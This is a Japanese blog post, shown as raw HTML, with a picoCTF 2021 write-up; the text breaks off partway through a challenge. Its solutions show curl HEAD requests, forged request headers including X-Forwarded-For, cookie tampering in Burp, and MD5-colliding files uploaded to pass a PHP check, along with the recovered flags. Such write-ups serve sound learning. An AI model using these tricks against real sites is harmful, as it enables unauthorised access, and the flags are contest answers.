<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>picoCTF 2021 Writeup - CTF フラxxグゲット</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />



<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />


<meta name="generator" content="Hugo 0.119.0 with theme even" />


<link rel="canonical" href="https://captureamerica.github.io/writeups/post/picoctf_2021/" />
<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">



<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">



<meta property="og:title" content="picoCTF 2021 Writeup" />
<meta property="og:description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2021/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-10T19:00:00+09:00" />
<meta property="article:modified_time" content="2021-04-10T19:00:00+09:00" />
<meta itemprop="name" content="picoCTF 2021 Writeup">
<meta itemprop="description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな"><meta itemprop="datePublished" content="2021-04-10T19:00:00+09:00" />
<meta itemprop="dateModified" content="2021-04-10T19:00:00+09:00" />
<meta itemprop="wordCount" content="6573">
<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="picoCTF 2021 Writeup"/>
<meta name="twitter:description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="https://captureamerica.github.io/writeups/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="https://captureamerica.github.io/writeups/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="https://captureamerica.github.io/writeups/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="https://captureamerica.github.io/writeups/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="https://captureamerica.github.io/writeups/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">picoCTF 2021 Writeup</h1>

      <div class="post-meta">
        <span class="post-time"> 2021-04-10 </span>
        <div class="post-category">
            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
            </div>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#web-ancient-history-10-points">[Web]: Ancient History (10 points)</a>
      <ul>
        <li><a href="#challenge">Challenge</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-get-ahead-20-points">[Web]: GET aHEAD (20 points)</a>
      <ul>
        <li><a href="#challenge-1">Challenge</a></li>
        <li><a href="#solution-1">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-cookies-40-points">[Web]: Cookies (40 points)</a>
      <ul>
        <li><a href="#challenge-2">Challenge</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-scavenger-hunt-50-points">[Web]: Scavenger Hunt (50 points)</a>
      <ul>
        <li><a href="#challenge-3">Challenge</a></li>
        <li><a href="#solution-3">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-who-are-you-60-points">[Web]: Who are you? (60 points)</a>
      <ul>
        <li><a href="#challenge-4">Challenge</a></li>
        <li><a href="#solution-4">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-some-assembly-required-1-70-points">[Web]: Some Assembly Required 1 (70 points)</a>
      <ul>
        <li><a href="#challenge-5">Challenge</a></li>
        <li><a href="#solution-5">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-it-is-my-birthday-100-points">[Web]: It is my Birthday (100 points)</a>
      <ul>
        <li><a href="#challenge-6">Challenge</a></li>
        <li><a href="#solution-6">Solution</a></li>
      </ul>
    </li>
    <li><a href="#web-most-cookies-150-points">[Web]: Most Cookies (150 points)</a>
      <ul>
        <li><a href="#challenge-7">Challenge</a></li>
        <li><a href="#solution-7">Solution</a></li>
      </ul>
    </li>
    <li><a href="#crypto-mind-your-ps-and-qs-20-points">[Crypto]: Mind your Ps and Qs (20 points)</a>
      <ul>
        <li><a href="#challenge-8">Challenge</a></li>
        <li><a href="#solution-8">Solution</a></li>
      </ul>
    </li>
    <li><a href="#crypto-mini-rsa-70-points">[Crypto]: Mini RSA (70 points)</a>
      <ul>
        <li><a href="#challenge-9">Challenge</a></li>
        <li><a href="#solution-9">Solution</a></li>
      </ul>
    </li>
    <li><a href="#crypto-dachshund-attacks-80-points">[Crypto]: Dachshund Attacks (80 points)</a>
      <ul>
        <li><a href="#challenge-10">Challenge</a></li>
        <li><a href="#solution-10">Solution</a></li>
        <li><a href="#solution-11">Solution</a></li>
      </ul>
    </li>
    <li><a href="#reverse-speeds-and-feeds-50-points">[Reverse]: speeds and feeds (50 points)</a>
      <ul>
        <li><a href="#challenge-11">Challenge</a></li>
        <li><a href="#solution-12">Solution</a></li>
      </ul>
    </li>
    <li><a href="#reverse-shop-50-points">[Reverse]: Shop (50 points)</a>
      <ul>
        <li><a href="#challenge-12">Challenge</a></li>
        <li><a href="#solution-13">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-information-10-points">[Forensics]: Information (10 points)</a>
      <ul>
        <li><a href="#challenge-13">Challenge</a></li>
        <li><a href="#solution-14">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-matryoshka-doll-30-points">[Forensics]: Matryoshka doll (30 points)</a>
      <ul>
        <li><a href="#challenge-14">Challenge</a></li>
        <li><a href="#solution-15">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-wireshark-doo-dooo-do-doo-50-points">[Forensics]: Wireshark doo dooo do doo&hellip; (50 points)</a>
      <ul>
        <li><a href="#challenge-15">Challenge</a></li>
        <li><a href="#solution-16">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-macrohard-weakedge-60-points">[Forensics]: MacroHard WeakEdge (60 points)</a>
      <ul>
        <li><a href="#challenge-16">Challenge</a></li>
        <li><a href="#solution-17">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-trivial-flag-transfer-protocol-90-points">[Forensics]: Trivial Flag Transfer Protocol (90 points)</a>
      <ul>
        <li><a href="#challenge-17">Challenge</a></li>
        <li><a href="#solution-18">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-wireshark-twoo-twooo-two-twoo-100-points">[Forensics]: Wireshark twoo twooo two twoo&hellip; (100 points)</a>
      <ul>
        <li><a href="#challenge-18">Challenge</a></li>
        <li><a href="#solution-19">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-disk-disk-sleuth-110-points">[Forensics]: Disk, disk, sleuth! (110 points)</a>
      <ul>
        <li><a href="#challenge-19">Challenge</a></li>
        <li><a href="#solution-20">Solution</a></li>
      </ul>
    </li>
    <li><a href="#forensics-disk-disk-sleuth-ii-130-points">[Forensics]: Disk, disk, sleuth! II (130 points)</a>
      <ul>
        <li><a href="#challenge-20">Challenge</a></li>
        <li><a href="#solution-21">Solution</a></li>
      </ul>
    </li>
    <li><a href="#binary-whats-your-input-150-points">[Binary]: What&rsquo;s your input? (150 points)</a>
      <ul>
        <li><a href="#challenge-21">Challenge</a></li>
        <li><a href="#solution-22">Solution</a></li>
      </ul>
    </li>
    <li><a href="#binary-stonks-20-points">[Binary]: Stonks (20 points)</a>
      <ul>
        <li><a href="#challenge-22">Challenge</a></li>
        <li><a href="#solution-23">Solution</a></li>
      </ul>
    </li>
    <li><a href="#binary-heres-a-libc-90-points">[Binary]: Here&rsquo;s a LIBC (90 points)</a>
      <ul>
        <li><a href="#challenge-23">Challenge</a></li>
        <li><a href="#solution-24">Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <div class='align-right'>
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
</div>
<p>(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。)</p>
<p>URL: <a href="https://play.picoctf.org/practice">https://play.picoctf.org/practice</a></p>
<table><tr><td>
お詫び：
<p>どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしました。スミマセン。。</p>
<p><img src="https://captureamerica.github.io/writeups/img/picoctf_2021_announcement1.png" alt="picoctf_2021_announcement1.png"><br /></p>
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_announcement2.png" alt="picoctf_2021_announcement2.png">
</td></tr></table>
<br />
1820ポイントで、最終順位は431位でした。
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_Score.png" alt="picoctf_2021_Score.png">
<br />
<p>ここ3ヶ月間、プライベートの方が忙しくて全くCTFできていなかった割には、まぁまぁできた方かなと思います。</p>
<br />
<p>以下が解いたチャレンジの状況です。Binaryがほとんど手付かずでした。</p>
<p>[Web] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web.png" alt="picoctf_2021_web.png"></p>
<br />
<p>[Crypto] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto1.png" alt="picoctf_2021_crypto1.png"></p>
<br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto2.png" alt="picoctf_2021_crypto2.png">
<br />
<p>[Reverse] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_rev.png" alt="picoctf_2021_rev.png"></p>
<br />
<p>[Forensics] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_forensic.png" alt="picoctf_2021_forensic.png"></p>
<br />
<p>[General Skills] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_general.png" alt="picoctf_2021_general.png"></p>
<br />
<p>[Binary] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_binary.png" alt="picoctf_2021_binary.png"></p>
<p><br /><br /></p>
<h2 id="web-ancient-history-10-points">[Web]: Ancient History (10 points)</h2>
<hr>
<h3 id="challenge">Challenge</h3>
<blockquote>
<p>I must have been sleep hacking or something, I don&rsquo;t remember visiting all of these sites&hellip;
<br /><br />
Hint1: What kind of information can JavaScript modify?
<br /><br />
Hint2: If you want to do this the un-fun way, the obfuscation is pretty lazy.</p>
</blockquote>
<br />
<h3 id="solution">Solution</h3>
<p>タイトルとヒントから、JavascriptでHistoryを残している模様。(どうやってやっているかは知らないです)</p>
<br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_ancient_history.png" alt="picoctf_2021_ancient_history.png">
<p>Javascriptを含んでいるHTMLソースをテキストファイルにしておいて、以下をやってフラグ部分を取り出しました。</p>
<pre>
$ cat ancient_history.txt | cut -d: -f2 | cut -c -15 | grep index | cut -d? -f2 | cut -c -1 | tr -d "\n" ; echo
</pre>
<br />
<p>Flag: <code>picoCTF{th4ts_k1nd4_n34t_bb660d55}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-get-ahead-20-points">[Web]: GET aHEAD (20 points)</h2>
<hr>
<h3 id="challenge-1">Challenge</h3>
<blockquote>
<p>Find the flag being held on this server to get ahead of the competition <a href="http://mercury.picoctf.net:21939/">http://mercury.picoctf.net:21939/</a></p>
</blockquote>
<br />
<h3 id="solution-1">Solution</h3>
<p>HEADメソッドでアクセス。</p>
<pre>
$ curl -v -X HEAD http://mercury.picoctf.net:21939/
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the
Warning: way you want. Consider using -I/--head instead.
*   Trying 18.189.209.142...
* TCP_NODELAY set
* Connected to mercury.picoctf.net (18.189.209.142) port 21939 (#0)
> HEAD / HTTP/1.1
> Host: mercury.picoctf.net:21939
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200 OK
< flag: picoCTF{r3j3ct_th3_du4l1ty_6ef27873}
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
<
* Closing connection 0
</pre>
<br />
<p>Flag: <code>picoCTF{r3j3ct_th3_du4l1ty_6ef27873}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-cookies-40-points">[Web]: Cookies (40 points)</h2>
<hr>
<h3 id="challenge-2">Challenge</h3>
<blockquote>
<p>Who doesn&rsquo;t love cookies? Try to figure out the best one. <a href="http://mercury.picoctf.net:17781/">http://mercury.picoctf.net:17781/</a></p>
</blockquote>
<br />
<h3 id="solution-2">Solution</h3>
<p>Burpを使って解きました。</p>
<p>GET /check をしているHTTP RequestをRepeaterに入れて、Cookie: name=XX のところの数字を変えてSendしていったら、18のところでフラグが取れました。</p>
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_cookies.png" alt="picoctf_2021_cookies.png">
<br />
<p>Flag: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-scavenger-hunt-50-points">[Web]: Scavenger Hunt (50 points)</h2>
<hr>
<h3 id="challenge-3">Challenge</h3>
<blockquote>
<p>There is some interesting information hidden around this site <a href="http://mercury.picoctf.net:44070/">http://mercury.picoctf.net:44070/</a>. Can you find it?
<br /><br />
Hint: You should have enough hints to find the files, don&rsquo;t run a brute forcer.</p>
</blockquote>
<br />
<h3 id="solution-3">Solution</h3>
<p>まずは、View Sourceでcssとかのファイルを見ていくと、part2まで見つかります。</p>
<pre>
Here's the first part of the flag: picoCTF{t
</pre>
<pre>
/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
</pre>
<br />
<p>part3は、robots.txtの中にあります。次のヒントも含まれます。</p>
<pre>
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
</pre>
<br />
part4は、.htaccessの中にあります。次のヒントも含まれます。
<pre>
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
</pre>
<br />
part5は、.DS_Storeの中にあります。
<pre>
Congrats! You completed the scavenger hunt. Part 5: _7a46d25d}
</pre>
<br />
<p>Flag: <code>picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_7a46d25d}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-who-are-you-60-points">[Web]: Who are you? (60 points)</h2>
<hr>
<h3 id="challenge-4">Challenge</h3>
<blockquote>
<p>Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn <a href="http://mercury.picoctf.net:1270/">http://mercury.picoctf.net:1270/</a>
<br /><br />
Hint: It ain&rsquo;t much, but it&rsquo;s an RFC <a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a></p>
</blockquote>
<br />
<h3 id="solution-4">Solution</h3>
<p>表示されるメッセージを元に、ヘッダを追加していくチャレンジです。</p>
<blockquote>
<p>I don&rsquo;t trust users visiting from another site.</p>
</blockquote>
<p>以下のヘッダを追加します。</p>
<pre>
User-Agent: PicoBrowser
</pre>
<br />
<blockquote>
<p>I don&rsquo;t trust users visiting from another site.</p>
</blockquote>
<p>以下のヘッダを追加します。</p>
<pre>
Referer:http://mercury.picoctf.net:1270/
</pre>
<br />
<blockquote>
<p>Sorry, this site only worked in 2018.</p>
</blockquote>
<p>以下のヘッダを追加します。</p>
<pre>
Date: Mon, 01 Jan 2018 00:00:00 GMT
</pre>
<br />
<blockquote>
<p>I don&rsquo;t trust users who can be tracked.</p>
</blockquote>
<p>以下のヘッダを追加します。DNTは、Do Not Trackの略ですね。</p>
<pre>
DNT: 1
</pre>
<br />
<blockquote>
<p>This website is only for people from Sweden.</p>
</blockquote>
<p>適当にスウェーデンのIPを調べて、以下のヘッダを追加します。</p>
<pre>
X-Forwarded-For: 94.234.37.10
</pre>
<br />
<blockquote>
<p>You&rsquo;re in Sweden but you don&rsquo;t speak Swedish?</p>
</blockquote>
<p>&ldquo;accept-language sweden&quot;でググったら、sv-SEというのが正解らしいです。以下のヘッダを追加します。</p>
<pre>
Accept-Language: sv-SE
</pre>
<br />
<p>最終的に、curlコマンドは以下のようになりました。</p>
<pre>
curl -v -H "User-Agent: PicoBrowser" -H "Referer:http://mercury.picoctf.net:1270/" -H "Date: Mon, 01 Jan 2018 00:00:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 94.234.37.10" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:1270/
</pre>
<br />
<p>Flag: <code>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_f56f58a5}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-some-assembly-required-1-70-points">[Web]: Some Assembly Required 1 (70 points)</h2>
<hr>
<h3 id="challenge-5">Challenge</h3>
<blockquote>
<p><a href="http://mercury.picoctf.net:55336/index.html">http://mercury.picoctf.net:55336/index.html</a></p>
</blockquote>
<br />
<h3 id="solution-5">Solution</h3>
<p>Developer toolでJavascriptの中を適当にstepしていったら、フラグが出てきました。</p>
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web_asm.png" alt="picoctf_2021_web_asm.png">
<br />
<p>Flag: <code>picoCTF{51e513c498950a515b1aab5e941b2615}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-it-is-my-birthday-100-points">[Web]: It is my Birthday (100 points)</h2>
<hr>
<h3 id="challenge-6">Challenge</h3>
<blockquote>
<p>I sent out 2 invitations to all of my friends for my birthday! I&rsquo;ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn&rsquo;t believe how long it took me to find a collision. Anyway, see if you&rsquo;re invited by submitting 2 PDFs to my website. <a href="http://mercury.picoctf.net:11590/">http://mercury.picoctf.net:11590/</a>
<br /><br />
Hint1: Look at the category of this problem.
<br /><br />
Hint2: How may a PHP site check the rules in the description?</p>
</blockquote>
<br />
<h3 id="solution-6">Solution</h3>
<p>md5の一致する2つの異なるPDFをSubmitしたらよさそうな感じです。</p>
<br />
ネットで見つけた画像をアップしてみたところ、`File too large!` と出たので、なるべく小さいファイルを探すことにしました。
<br />
見つけたのがこれ。4kバイトのelfファイルです。
<p><a href="https://www.mscs.dal.ca/~selinger/md5collision/">https://www.mscs.dal.ca/~selinger/md5collision/</a></p>
<pre>
-rw-r--r--@  1 xxxx  staff    4072 Mar 29 12:20 erase
-rw-r--r--@  1 xxxx  staff    4072 Mar 29 12:19 hello
</pre>
<br />
<p>拡張子に.pdfを付けてアップしたら、index.phpが表示されて、その中にフラグがありました。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;submit&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$type1</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file1&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$type2</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file2&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$size1</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file1&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$size2</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file2&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$SIZE_LIMIT</span> <span class="o">=</span> <span class="mi">18</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nv">$size1</span> <span class="o">&lt;</span> <span class="nv">$SIZE_LIMIT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$size2</span> <span class="o">&lt;</span> <span class="nv">$SIZE_LIMIT</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="nv">$type1</span> <span class="o">==</span> <span class="s2">&#34;application/pdf&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$type2</span> <span class="o">==</span> <span class="s2">&#34;application/pdf&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$contents1</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file1&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$contents2</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file2&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$contents1</span> <span class="o">!=</span> <span class="nv">$contents2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">md5_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file1&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">])</span> <span class="o">==</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file2&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;MD5 hashes do not match!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Files are not different!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Not a PDF!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;File too large!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br />
<p>Flag: <code>picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="web-most-cookies-150-points">[Web]: Most Cookies (150 points)</h2>
<hr>
<h3 id="challenge-7">Challenge</h3>
<blockquote>
<p>Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py <a href="http://mercury.picoctf.net:65344/">http://mercury.picoctf.net:65344/</a>
<br /><br />
Hint1: How secure is a flask cookie?</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>server.py</li>
</ul>
<p>中身</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
